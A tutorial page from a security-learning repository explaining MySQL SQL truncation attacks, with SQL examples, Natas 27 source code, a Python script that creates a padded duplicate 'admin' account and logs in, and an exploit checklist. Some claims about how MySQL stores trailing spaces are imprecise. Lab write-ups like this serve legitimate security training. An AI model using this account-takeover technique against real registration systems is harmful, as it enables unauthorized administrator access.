# 🌐 Web Security — SQL Truncation Attack

> Before MySQL truncates data that doesn't fit a VARCHAR field, it also strips spaces.
> Using this behavior, you can register as if you were a different user.

---

## 📋 Table of Contents

- [What Is SQL Truncation?](#what-is-sql-truncation)
- [MySQL VARCHAR Behavior](#mysql-varchar-behavior)
- [Trailing Space + Truncation](#trailing-space--truncation)
- [Authentication Bypass Scenario](#authentication-bypass-scenario)
- [Usage in Natas](#usage-in-natas)

---

## What Is SQL Truncation?

In MySQL, when a string longer than n characters is INSERTed into a VARCHAR(n) field, MySQL **truncates** the data to n characters. Moreover, MySQL also exhibits some special behaviors when stripping trailing spaces.

```sql
CREATE TABLE users (
    username VARCHAR(16),
    password VARCHAR(16)
);

INSERT INTO users VALUES ('admin               x', 'password');
-- username is truncated to 16 characters: "admin           " (16 characters)
-- Then MySQL also removes the trailing spaces → "admin"
```

---

## MySQL VARCHAR Behavior

```sql
-- Insert 15 characters into a VARCHAR(10) field
INSERT INTO test VALUES ('12345678901234X');
-- Stored: '1234567890' (10 characters, X and everything after is truncated)

-- Trailing space case
INSERT INTO test VALUES ('admin     X');
-- VARCHAR(10): 'admin     ' (10 characters, X is truncated)
-- MySQL ignores trailing spaces in comparisons
-- SELECT * WHERE username='admin' → finds this record!
```

### Interaction with the UNIQUE Constraint

```sql
CREATE TABLE users (
    username VARCHAR(16) UNIQUE,
    password VARCHAR(16)
);

-- "admin" is already registered
INSERT INTO users VALUES ('admin', 'password1');   -- OK
INSERT INTO users VALUES ('admin', 'password2');   -- ERROR: Duplicate entry
INSERT INTO users VALUES ('admin          x', 'password3');
-- After truncation: 'admin          ' → same as 'admin'!
-- But in some MySQL configurations this may not be a UNIQUE violation
-- and the record can be created
```

---

## Trailing Space + Truncation

### The Attack Idea

1. The `admin` user is registered in the system, and we don't know its password
2. If we try to register with `admin`, the `UNIQUE` constraint blocks us
3. But if we send `"admin" + spaces + "x"`:
   - MySQL truncates it → `"admin          "` (16 characters)
   - The trailing spaces are meaningless → it behaves like `"admin"`
   - A new record is created — **with a password of our choosing**
4. When logging in, the username is `admin` and the password is the one we set
5. MySQL may find both records in the `WHERE username='admin'` query
   — the first one found is our record → login successful!

---

## Authentication Bypass Scenario

```sql
-- Current state:
-- users table, username VARCHAR(64)
-- admin is registered, its password is unknown

-- Attack:
INSERT INTO users (username, password)
VALUES ('admin                                                              x', 'our_password');
--       ↑ 64+ characters: "admin" + 59 spaces + "x"
-- MySQL truncates it → "admin" + 59 spaces (5+59 = 64 characters, the trailing "x" is dropped)
-- Trailing space → stored like "admin"

-- Login:
SELECT * FROM users WHERE username='admin' AND password='our_password'
-- This query finds our record!
```

---

## Usage in Natas

### Natas 27 — Admin Access via Truncation

**Source code (summary):**

```php
<?php
// username VARCHAR(64)

function checkCredentials($link, $usr, $pass) {
    $user = mysql_real_escape_string($usr);
    $pass = mysql_real_escape_string($pass);
    $pass = md5($pass);

    $query = "SELECT username from users where username='$user' and password='$pass'";
    $res   = mysql_query($query, $link);
    if(mysql_num_rows($res) > 0) return true;
    return false;
}

function createUser($link, $usr, $pass) {
    // Create the user if it doesn't exist
    if(!doesUserExist($link, $usr)) {
        $user = mysql_real_escape_string($usr);
        $pass = mysql_real_escape_string($pass);
        $pass = md5($pass);
        $query = "INSERT INTO `users` (`username`, `password`) VALUES ('$user','$pass')";
        mysql_query($query, $link);
    }
}

function doesUserExist($link, $usr) {
    $user  = mysql_real_escape_string($usr);
    $query = "SELECT * FROM users WHERE username='$user'";
    $res   = mysql_query($query, $link);
    if(mysql_num_rows($res) > 0) return true;
    return false;
}
```

**Problem:**

`doesUserExist()` → `WHERE username='admin                 x'` → this value does **not match** the existing `admin` record, because **the string literal in a SELECT's WHERE clause is NOT truncated** (truncation only happens on INSERT) → the trailing `x` remains, so `doesUserExist` returns **false** → `createUser` **is called**.

The key point is *where* the truncation happens: not in the SELECT, but only in the **INSERT** performed by `createUser`. When the value `'admin'+spaces+'x'` is written to the VARCHAR(64) column, everything past the 64th character (i.e., the `x`) is trimmed.

Result: a **second `admin` record** is created in the table — with a password that *we* chose. Then `checkCredentials('admin', our_password)` matches this new record → admin login. (When MySQL strict mode is off, an overly long VARCHAR value is silently trimmed instead of raising an error.)

**Exploit:**

```python
import requests

url      = "http://natas27.natas.labs.overthewire.org/"
username = "natas27"
password = "[natas27_password]"

# "admin" + 59 spaces + "x" = 65 characters (EXCEEDS the VARCHAR(64) limit → "x" is trimmed, leaving "admin"+spaces)
evil_user = "admin" + " " * 59 + "x"
evil_pass = "hello"

# Step 1: Create the fake admin account
r = requests.post(
    url,
    data={"username": evil_user, "password": evil_pass},
    auth=(username, password)
)
print("[*] Registration request sent")

# Step 2: Log in with the truncated admin
r = requests.post(
    url,
    data={"username": "admin", "password": evil_pass},
    auth=(username, password)
)
if "natas28" in r.text or "Password" in r.text:
    print("[✓] Admin login successful!")
    print(r.text)
```

---

### Truncation — Checklist

```
Detection:
  ☐ Is there a registration form?
  ☐ What is the VARCHAR length in the table schema?
  ☐ Is strict mode off? (old MySQL version)
  ☐ Does doesUserExist check before or after truncation?

Exploit:
  ☐ [target_user] + [spaces] + [random character]
  ☐ The total length must exceed the VARCHAR limit
  ☐ Register with your own password
  ☐ Log in with the clean username
```

---

## 🔗 Resources

- [SQL Truncation Attack — Basics](https://resources.infosecinstitute.com/topic/sql-truncation-attack/)
- [MySQL — String Truncation](https://dev.mysql.com/doc/refman/8.0/en/sql-mode.html#sqlmode_strict_all_tables)
- [OWASP — SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

---

**Previous topic:** [18_php_object_injection.md](./18_php_object_injection.md)
**Next topic:** [20_ecb_mode_vulnerability.md](./20_ecb_mode_vulnerability.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
